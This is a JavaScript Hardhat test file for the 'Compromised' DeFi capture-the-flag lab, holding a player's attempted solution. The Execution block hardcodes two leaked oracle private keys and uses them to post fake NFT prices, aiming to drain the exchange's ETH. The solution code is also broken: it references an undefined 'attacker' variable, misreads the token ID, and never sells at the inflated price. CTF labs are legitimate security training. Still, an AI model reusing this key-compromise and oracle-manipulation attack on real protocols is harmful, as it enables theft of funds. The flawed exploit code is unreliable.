const { expect } = require("chai");
const { ethers } = require("hardhat");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

/*
0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
*/

describe("Compromised challenge", function () {
  let deployer, player;
  let oracle, exchange, nftToken;

  const sources = [
    "0xA73209FB1a42495120166736362A1DfA9F95A105",
    "0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
    "0x81A5D6E50C214044bE44cA0CB057fe119097850c",
  ];

  const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
  const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n; // 0.1 ETH
  const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    // Initialize balance of the trusted source addresses
    for (let i = 0; i < sources.length; i++) {
      setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
      expect(await ethers.provider.getBalance(sources[i])).to.equal(
        TRUSTED_SOURCE_INITIAL_ETH_BALANCE
      );
    }

    // Player starts with limited balance
    setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.equal(
      PLAYER_INITIAL_ETH_BALANCE
    );

    // Deploy the oracle and setup the trusted sources with initial prices
    const TrustfulOracleInitializerFactory = await ethers.getContractFactory(
      "TrustfulOracleInitializer",
      deployer
    );
    oracle = await (
      await ethers.getContractFactory("TrustfulOracle", deployer)
    ).attach(
      await (
        await TrustfulOracleInitializerFactory.deploy(
          sources,
          ["DVNFT", "DVNFT", "DVNFT"],
          [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
        )
      ).oracle()
    );

    // Deploy the exchange and get an instance to the associated ERC721 token
    exchange = await (
      await ethers.getContractFactory("Exchange", deployer)
    ).deploy(oracle.address, { value: EXCHANGE_INITIAL_ETH_BALANCE });
    nftToken = await (
      await ethers.getContractFactory("DamnValuableNFT", deployer)
    ).attach(await exchange.token());
    expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
    expect(await nftToken.rolesOf(exchange.address)).to.eq(
      await nftToken.MINTER_ROLE()
    );
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    console.log("Token Symbol : %s", await nftToken.symbol());
    console.log("Token Owner : %s", await nftToken.owner());
    console.log(
      "DVNFT Price : %s",
      (await oracle.getMedianPrice("DVNFT")) / 10e17
    );

    const oracle1 = new ethers.Wallet(
      "0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744",
      ethers.provider
    );
    const oracle2 = new ethers.Wallet(
      "0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159",
      ethers.provider
    );

    console.log("Oracle Source 1 Address : %s", oracle1.address);
    console.log("Oracle Source 2 Address : %s", oracle2.address);

    await oracle.connect(oracle1).postPrice("DVNFT", 0);
    await oracle.connect(oracle2).postPrice("DVNFT", 0);

    console.log(
      "DVNFT Price : %s",
      (await oracle.getMedianPrice("DVNFT")) / 10e17
    );

    let tokenId = await exchange.connect(player).buyOne({
      value: PLAYER_INITIAL_ETH_BALANCE,
    });

    console.log("Token ID : %s", tokenId);

    await nftToken.connect(attacker).approve(exchange.address, tokenId);
    await exchange.connect(attacker).sellOne(tokenId);

    console.log(
      "Player Balance : %s",
      await ethers.provider.getBalance(player.address)
    );

    await oracle
      .connect(oracle1)
      .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
    await oracle
      .connect(oracle2)
      .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Exchange must have lost all ETH
    expect(await ethers.provider.getBalance(exchange.address)).to.be.eq(0);

    // Player's ETH balance must have significantly increased
    expect(await ethers.provider.getBalance(player.address)).to.be.gt(
      EXCHANGE_INITIAL_ETH_BALANCE
    );

    // Player must not own any NFT
    expect(await nftToken.balanceOf(player.address)).to.be.eq(0);

    // NFT price shouldn't have changed
    expect(await oracle.getMedianPrice("DVNFT")).to.eq(INITIAL_NFT_PRICE);
  });
});